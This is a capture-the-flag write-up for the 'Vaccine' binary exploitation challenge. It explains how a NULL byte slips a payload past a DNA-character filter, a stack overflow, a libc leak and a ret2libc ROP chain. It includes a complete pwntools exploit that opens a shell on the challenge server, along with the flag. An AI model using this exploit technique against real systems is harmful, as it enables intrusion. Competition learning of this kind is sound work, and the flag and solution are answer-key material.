# Vaccine - CTF Challenge Writeup

## Challenge Information
- **Name:** Vaccine
- **Category:** Binary Exploitation / PWN
- **Difficulty:** Medium
- **Connection:** `nc 37.27.26.173 1337`

---

## Initial Analysis

### Binary Information
```bash
checksec vaccine
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**Key Observations:**
- ✅ No Stack Canary - Stack buffer overflow possible
- ✅ No PIE - Fixed addresses, easy ROP
- ⚠️ NX Enabled - Can't execute shellcode on stack
- ⚠️ Partial RELRO - GOT writable but we'll use ROP instead

### Decompilation (Ghidra/IDA)

```c
int main(int argc, const char **argv, const char **envp)
{
  size_t v3;
  char v5[112];     // [rsp+10h] [rbp-170h] - flag buffer
  char s2[112];     // [rsp+80h] [rbp-100h] - user input (VULNERABLE!)
  char s[104];      // [rsp+F0h] [rbp-90h]  - RNA.txt buffer
  FILE *v8;
  FILE *stream;
  int i;
  
  stream = fopen("RNA.txt", "r");
  fgets(s, 100, stream);  // Reads "REDACTED" into s
  
  printf("Give me vaccine: ");
  fflush(stdout);
  __isoc99_scanf("%s", s2);  // ⚠️ NO BOUNDS CHECK - VULNERABLE!
  
  // DNA validation loop
  for (i = 0; i < strlen(s2); i++)
  {
    if (s2[i] != 'A' && s2[i] != 'C' && s2[i] != 'G' && s2[i] != 'T')
    {
      puts("Only DNA codes allowed!");
      exit(0);
    }
  }
  
  if (strcmp(s, s2))  // Compare RNA with input
  {
    puts("Oops.. Try again later");
    exit(0);
  }
  
  puts("Congrats! You give the correct vaccine!");
  v8 = fopen("secret.txt", "r");
  fgets(v5, 100, v8);
  printf("Here is your reward: %s\n", v5);
  return 0;
}
```

---

## Vulnerability Analysis

### 1. Buffer Overflow
```c
char s2[112];     // Buffer size: 112 bytes
scanf("%s", s2);  // NO SIZE LIMIT - Can overflow!
```

The `scanf("%s", s2)` reads input without bounds checking, allowing us to write past the 112-byte `s2` buffer.

### 2. DNA Character Restriction
```c
for (i = 0; i < strlen(s2); i++)
{
    if (s2[i] != 'A' && s2[i] != 'C' && s2[i] != 'G' && s2[i] != 'T')
        exit(0);
}
```

Only characters A (0x41), C (0x43), G (0x47), T (0x54) are allowed. This prevents traditional payloads containing arbitrary bytes.

### 3. Stack Layout
```
[rbp-0x170] v5[112]      - Flag buffer
[rbp-0x100] s2[112]      - User input ← Overflow starts here
[rbp-0x90]  s[104]       - RNA.txt buffer
[rbp-0x28]  v8           - File pointer
[rbp-0x20]  stream       - File pointer
[rbp-0x14]  i            - Loop counter
[rbp-0x8]   saved RBX    
[rbp]       saved RBP    
[rbp+0x8]   return addr  ← Target for ROP chain
```

Distance from `s2[0]` to return address: **264 bytes**

---

## The Key Trick: NULL Byte Bypass

### Understanding scanf and strlen

**Critical Discovery:** We can use NULL bytes (`\x00`) to bypass the DNA validation!

#### Test: How scanf handles NULL bytes

```c
char buffer[100];
scanf("%s", buffer);
// If input: "ABC\x00DEF\n"
// Result: buffer = ['A', 'B', 'C', '\x00', 'D', 'E', 'F', '\x00', ...]
```

**scanf writes NULL bytes into the buffer, but strlen stops at the first NULL!**

```python
# Test in Python
import sys
sys.stdout.buffer.write(b'ABC\x00DEF\n')
```

Result:
```
[0]: 'A'
[1]: 'B'  
[2]: 'C'
[3]: '\0'  ← NULL byte written!
[4]: 'D'
[5]: 'E'
[6]: 'F'
[7]: '\0'

strlen(buffer) = 3  ← Only counts up to first NULL!
```

#### Exploitation Strategy

```python
payload = b"A\x00" + b"P"*262 + ROP_CHAIN
```

**What happens:**
1. `scanf` writes ALL bytes (including `\x00` and P's) into buffer
2. `strlen(s2)` returns **1** (only counts 'A')
3. Validation loop only checks `s2[0] = 'A'` ✓
4. The P's and ROP chain are **never validated**!
5. Buffer overflow occurs, overwriting return address

---

## Exploitation Steps

### Step 1: Find RIP Offset

Using cyclic pattern:
```python
from pwn import *

pattern = cyclic(300)
payload = b"A\x00" + pattern

# In GDB: x/gx $rsp at crash
# cyclic_find(0x6161616b61616a61) → Offset = 264
```

**Result:** Return address is at offset **264 bytes** from `s2[0]`

### Step 2: Leak Libc Address

Since NX is enabled, we need to:
1. Leak a libc function address from GOT
2. Calculate libc base
3. Find `system()` and `"/bin/sh"`
4. Build ROP chain to call `system("/bin/sh")`

**Why leak is needed:**
- Libc has PIE enabled (ASLR)
- Addresses change every run
- Must leak to find current addresses

#### ROP Gadgets
```bash
ROPgadget --binary vaccine | grep "pop rdi"
# 0x0000000000401443 : pop rdi ; ret

ROPgadget --binary vaccine | grep "ret"
# 0x000000000040101a : ret
```

#### Stage 1 Payload: Leak printf address
```python
pop_rdi = 0x401443
ret = 0x40101a
puts_plt = 0x401120        # calls puts()
printf_got = 0x404038      # contains printf's real address
main = 0x401236            # return to main for second exploit

# ROP chain: puts(printf_got) then return to main
rop_chain = p64(pop_rdi) + p64(printf_got) + p64(puts_plt) + p64(main)

# Full payload with NULL byte trick
payload1 = b"A\x00" + b"B"*110 + b"A\x00" + b"B"*150 + rop_chain
#          ^^^^^^   ^^^^^^^^^^   ^^^^^^   ^^^^^^^^^^   ^^^^^^^^^
#          Bypass   Padding      More     Reach RIP    ROP chain
#          DNA      to s buffer  padding  (264 bytes)
```

**What this does:**
```asm
pop rdi              ; rdi = 0x404038 (printf_got)
call puts            ; puts(0x404038) - prints printf's address!
jmp main             ; return to main for second payload
```

### Step 3: Calculate Libc Addresses

```python
# Receive leaked address
p.recvuntil(b"Congrats! You give the correct vaccine!\n")
p.recvuntil(b"Here is your reward: ")
p.recvline()  # Skip "REDACTED\n"
leak = p.recvline()[:-1]  # Get leaked address

# Parse address
printf_libc = u64(leak.ljust(8, b'\x00'))

# Calculate offsets from libc file
system_offset = libc.symbols['printf'] - libc.symbols['system']
binsh_offset = libc.symbols['printf'] - next(libc.search(b"/bin/sh"))

# Calculate real addresses
libc_base = printf_libc - libc.symbols['printf']
system = printf_libc - system_offset
binsh = printf_libc - binsh_offset
```

**Why this works:**
- Distance between functions in libc is fixed
- If printf is at `0x7fff12064f70`
- And offset from printf to system is `0x14210`
- Then system is at `0x7fff12064f70 - 0x14210 = 0x7fff12050d60`

### Step 4: Get Shell

```python
# ROP chain: system("/bin/sh")
rop_chain2 = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
#            ^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#            Stack      Set rdi = "/bin/sh", call system()
#            alignment

payload2 = b"A\x00" + b"B"*110 + b"A\x00" + b"B"*150 + rop_chain2

p.sendlineafter(b"vaccine:", payload2)
p.interactive()  # Shell!
```

**Why `ret` gadget?**
- Stack alignment for modern libc
- Some functions require 16-byte aligned stack
- Extra `ret` ensures proper alignment

---

## Complete Exploit

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./vaccine")
libc = ELF("./libc-2.31.so")

# Calculate offsets
system_offset = libc.symbols['printf'] - libc.symbols['system']
binsh_offset = libc.symbols['printf'] - next(libc.search(b"/bin/sh"))

# Gadgets and addresses
pop_rdi = 0x401443
ret = 0x40101a
puts = elf.symbols['puts']
printf_got = elf.symbols['got.printf']

# Connect
p = remote("37.27.26.173", 1337)

# Stage 1: Leak libc
payload1 = p64(pop_rdi) + p64(printf_got) + p64(puts) + p64(elf.symbols['main'])
pa1 = b"A\x00" + b"B" * 110 + b"A\x00" + b"B" * 150 + payload1

p.recvuntil(b"vaccine:")
p.sendline(pa1)

# Parse leak
p.recvuntil(b"Congrats! You give the correct vaccine!\n")
p.recvuntil(b"Here is your reward: ")
p.recvline()  # Skip REDACTED
leak = p.recvline()[:-1]

printf_libc = u64(leak.ljust(8, b'\x00'))
system = printf_libc - system_offset
binsh = printf_libc - binsh_offset

log.success(f"printf: {hex(printf_libc)}")
log.success(f"system: {hex(system)}")
log.success(f"binsh:  {hex(binsh)}")

# Stage 2: Get shell
payload2 = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
pa2 = b'A\x00' + b'B' * 110 + b'A\x00' + b'B' * 150 + payload2

p.sendlineafter(b"vaccine:", pa2)
p.interactive()
```

### Execution

```bash
$ python3 exploit.py
[+] Opening connection to 37.27.26.173 on port 1337
[+] printf: 0x7f1234064f70
[+] system: 0x7f1234050d60
[+] binsh:  0x7f12341b75aa
[*] Switching to interactive mode
$ cat flag.txt
MCC{RoP_3@zy_Pe4$y}
```

---

## Key Takeaways

### 1. NULL Byte Exploitation
- `scanf("%s")` writes NULL bytes into buffer
- `strlen()` stops at first NULL
- Can bypass character restrictions by hiding payload after NULL

### 2. ret2libc Technique
- When NX is enabled, can't execute shellcode
- Leak libc address from GOT
- Calculate function addresses
- ROP to `system("/bin/sh")`

### 3. Stack Alignment
- Modern libc requires 16-byte aligned stack
- Add extra `ret` gadget before function calls
- Prevents segfaults in libc functions

### 4. Why Use Binary Gadgets vs Libc Gadgets
- Binary has no PIE → addresses are fixed
- Libc has PIE → need leak first
- Simpler to use binary gadgets when available

---

## Tools Used
- **pwntools** - Exploit development framework
- **GDB/pwndbg** - Debugging and analysis
- **Ghidra/IDA** - Reverse engineering
- **ROPgadget** - Finding ROP gadgets
- **checksec** - Binary security analysis

---

## References
- https://github.com/acsc-org/acsc-challenges-2023-public/blob/main/pwn/vaccine/solution/solve.py
- https://github.com/krloer/ctf_krloer_com/blob/main/content/writeups/acsc/vaccine/index.md
---

**Flag:** `MCC{RoP_3@zy_Pe4$y}`

*Writeup by: [Your Name]*  
*Date: December 2024*
